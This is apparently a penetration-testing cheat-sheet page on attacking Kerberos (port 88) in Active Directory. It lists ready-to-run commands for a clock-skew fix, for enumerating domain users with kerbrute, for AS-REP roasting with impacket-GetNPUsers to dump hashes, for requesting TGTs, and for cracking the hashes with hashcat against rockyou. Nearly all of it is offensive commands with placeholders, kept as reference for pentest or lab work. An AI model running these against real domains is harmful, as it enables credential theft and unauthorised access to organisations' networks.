# KRB 88

{% hint style="info" %}
If error KRB\_AP\_ERR\_SKEW happen:

{% code overflow="wrap" %}
```bash
timedatectl set-ntp false
ntpdate <IP>
```
{% endcode %}
{% endhint %}

### **Enum User**

```bash
kerbrute userenum -d <Domain> --dc <IP DC> <LIST>
```

### **AspeRoasting**

```bash
impacket-GetNPUsers '<NAME DOMAIN>/' -no-pass -usersfile users.txt -format hashcat -outputfile hash
```

### Kerberoasting

[kerberoasting.md](../windows/active-directory/exploitation-abuse/kerberoasting.md "mention")

### **TGT BruteForce**

```bash
impacket-getTGT '<DOMAIN>/<USERS>:<PWD>'
```

```bash
export KRB5CCNAME=..../user.chace
```

### **CRACK KRB5 HASH**

```bash
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
